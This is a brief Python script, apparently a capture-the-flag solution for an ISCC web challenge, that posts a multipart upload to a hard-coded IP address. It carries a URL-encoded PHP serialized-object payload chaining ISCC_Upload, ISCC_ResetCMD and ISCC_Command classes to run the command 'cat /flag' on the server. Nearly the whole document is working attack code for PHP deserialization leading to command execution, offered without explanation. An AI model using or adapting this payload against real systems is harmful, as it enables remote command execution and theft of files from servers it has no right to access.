import requests
url = 'http://39.96.91.106:7050'
s = requests.session()
# cmd = 'cat /flag'
files = {'_SESSION': ('isccIsCciScc1scc',"content") , 'iscc_file':('iscc.gif', open('iscc.gif','rb'), 'multipart/form-data')}
exp ='O%3A11%3A%22ISCC_Upload%22%3A1%3A%7Bs%3A7%3A%22padding%22%3BO%3A13%3A%22ISCC_ResetCMD%22%3A2%3A%7Bs%3A7%3A%22padding%22%3BO%3A12%3A%22ISCC_Command%22%3A0%3A%7B%7DS%3A10%3A%22%5C00%5C2a%5C00new_cmd%22%3Bs%3A9%3A%22cat+%2Fflag%22%3B%7D%7D'
url = url + '?%3f=' + exp
r = s.post(url, files=files)
print(r.content.decode())
